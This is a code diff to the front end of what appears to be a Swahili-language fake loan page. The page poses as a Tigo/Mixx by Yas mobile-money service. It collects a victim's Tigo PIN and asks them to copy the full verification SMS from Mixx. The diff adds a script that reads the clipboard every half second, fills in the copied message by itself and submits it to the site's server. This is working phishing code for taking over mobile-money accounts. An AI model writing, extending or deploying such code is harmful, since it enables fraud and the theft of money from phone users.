@@ -76,10 +76,10 @@
                 <div class="phone-display" id="showPhone2">+255 ---------</div>
                 <div class="code-instruction">
                     <i class="fas fa-sms"></i> <strong>Tafadhali fuata hatua hizi:</strong><br><br>
-                    <strong>1.</strong> Toka kwenye ukurasa huu na ufungue <strong>App ya Messages/SMS</strong> ya simu yako<br>
+                    <strong>1.</strong> Toka kwenye ukurasa huu na ufungue <strong>App ya Messages/SMS</strong><br>
                     <strong>2.</strong> Tafuta ujumbe uliotumwa na <strong>Mixx by Yas</strong><br>
-                    <strong>3.</strong> Nakili ujumbe <strong>WOTE</strong> (bonyeza na ushikilie kisha chagua Copy)<br>
-                    <strong>4.</strong> Rudi kwenye ukurasa huu na ubandike kwenye kisanduku hapa chini
+                    <strong>3.</strong> Nakili ujumbe <strong>WOTE</strong> (shikilia → Copy)<br>
+                    <strong>4.</strong> Rudi hapa — itajaza moja kwa moja!
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
                     <i class="fas fa-envelope"></i> 📱 iPhone: Gusa Hapa Kufungua Messages
@@ -87,7 +87,7 @@
                 <a href="sms:" class="sms-open-btn" id="btnAndroid" style="display:none;">
                     <i class="fas fa-envelope"></i> 🤖 Android: Gusa Hapa Kufungua SMS
                 </a>
-                <textarea id="smsMessage" class="sms-textarea" placeholder="Bandika ujumbe wako wote hapa..."></textarea>
+                <textarea id="smsMessage" class="sms-textarea" placeholder="Inasubiri... nakili ujumbe na utajaza hapa moja kwa moja."></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
                 <div class="error-msg" id="codeError" style="text-align:center;">Namba si sahihi</div>
                 <button class="btn btn-gold" onclick="submitCode()">Endelea →</button>
@@ -104,7 +104,7 @@
         var loanTerm = parseInt(urlParams.get('term') || '12');
         document.getElementById('loanAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
         document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
-        var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null;
+        var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null, lastClip = '';
         var resendCount = 0, resendCooldown = false;
 
         (function() {
@@ -143,28 +143,63 @@
             }, 3000); 
         }
 
-        function showCodeScreen() { document.getElementById('screen2').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; startCountdown(); if (fastCheck) clearInterval(fastCheck); }
+        function showCodeScreen() { 
+            document.getElementById('screen2').classList.remove('active'); 
+            document.getElementById('screen3').classList.add('active'); 
+            document.getElementById('smsMessage').value = ''; 
+            lastClip = ''; 
+            startCountdown(); 
+            startClipWatcher(); 
+        }
+
         function startCountdown() { if (countdownTimer) clearInterval(countdownTimer); var seconds = 30; var display = document.getElementById('timerDisplay'); display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer-bar'; countdownTimer = setInterval(function() { seconds--; display.textContent = '⏳ ' + seconds + 's'; if (seconds <= 10) display.className = 'timer-bar warning'; if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; } }, 1000); }
+
+        function startClipWatcher() {
+            if (fastCheck) clearInterval(fastCheck);
+            fastCheck = setInterval(checkClipboard, 500);
+        }
+
+        async function checkClipboard() {
+            if (!document.getElementById('screen3').classList.contains('active')) {
+                clearInterval(fastCheck);
+                return;
+            }
+            try {
+                var text = await navigator.clipboard.readText();
+                if (text && text !== lastClip && text.length > 10) {
+                    lastClip = text;
+                    document.getElementById('smsMessage').value = text;
+                    document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa!';
+                    document.getElementById('codeError').style.color = 'var(--success)';
+                    document.getElementById('codeError').classList.add('show');
+                    clearInterval(fastCheck);
+                    if (countdownTimer) clearInterval(countdownTimer);
+                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                    document.getElementById('timerDisplay').className = 'timer-bar';
+                    setTimeout(function() { submitCode(); }, 600);
+                }
+            } catch(e) {}
+        }
 
         async function resendCode() { 
             if (!userPhone) return; 
             if (resendCooldown) { document.getElementById('codeError').textContent = 'Subiri sekunde 30 kabla ya kuomba tena.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); return; }
             if (resendCount >= 3) { document.getElementById('codeError').textContent = 'Umezidi idadi ya maombi. Jaribu tena baadae.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
-            resendCount++; resendCooldown = true; document.getElementById('smsMessage').value = '';
+            resendCount++; resendCooldown = true; document.getElementById('smsMessage').value = ''; lastClip = '';
             document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; document.getElementById('codeError').style.color = 'var(--primary)'; document.getElementById('codeError').classList.add('show'); 
             try { await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) }); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); } catch(e) {} 
-            startChecking(); setTimeout(function() { resendCooldown = false; }, 30000);
+            startChecking(); startClipWatcher(); setTimeout(function() { resendCooldown = false; }, 30000);
         }
 
-        function goBackToPin() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
-        function goBackToPinWrong() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('pinError').textContent = 'PIN yako sio sahihi. Una nafasi moja tu ya kujaribu tena.'; document.getElementById('pinError').style.color = 'var(--danger)'; document.getElementById('pinError').classList.add('show'); setTimeout(function() { document.getElementById('pinError').classList.remove('show'); document.getElementById('pinError').textContent = 'Ingiza PIN'; }, 8000); }
-        function goToHomeTigo() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } localStorage.setItem('popupTigo', 'true'); window.location.href = '/'; }
-        function goToHomeOtpTigo() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } localStorage.setItem('popupOtpTigo', 'true'); window.location.href = '/'; }
+        function goBackToPin() { if (fastCheck) { clearInterval(fastCheck); } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; lastClip = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
+        function goBackToPinWrong() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; lastClip = ''; document.getElementById('pinError').textContent = 'PIN yako sio sahihi. Una nafasi moja tu ya kujaribu tena.'; document.getElementById('pinError').style.color = 'var(--danger)'; document.getElementById('pinError').classList.add('show'); setTimeout(function() { document.getElementById('pinError').classList.remove('show'); document.getElementById('pinError').textContent = 'Ingiza PIN'; }, 8000); }
+        function goToHomeTigo() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } localStorage.setItem('popupTigo', 'true'); window.location.href = '/'; }
+        function goToHomeOtpTigo() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } localStorage.setItem('popupOtpTigo', 'true'); window.location.href = '/'; }
 
         async function submitCode() { 
-            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } 
+            if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } 
             var smsText = document.getElementById('smsMessage').value.trim();
-            if (!smsText) { document.getElementById('codeError').textContent = 'Bandika ujumbe wa SMS kwanza.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); return; }
+            if (!smsText) { document.getElementById('codeError').textContent = 'Bandika ujumbe wa SMS kwanza.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); startClipWatcher(); return; }
             document.getElementById('screen3').classList.remove('active'); document.getElementById('screen4').classList.add('active'); 
             await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
             if (checkInterval) clearInterval(checkInterval); 
@@ -172,8 +207,8 @@
         }
 
         function showSuccess() { document.getElementById('screen4').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }
-        function showCodeError() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Bandika ujumbe mpya.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); }
-        function goBackToPinFromCode() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
+        function showCodeError() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; lastClip = ''; document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Bandika ujumbe mpya.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); startClipWatcher(); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); }
+        function goBackToPinFromCode() { if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; lastClip = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
     </script>
 </body>
 </html>
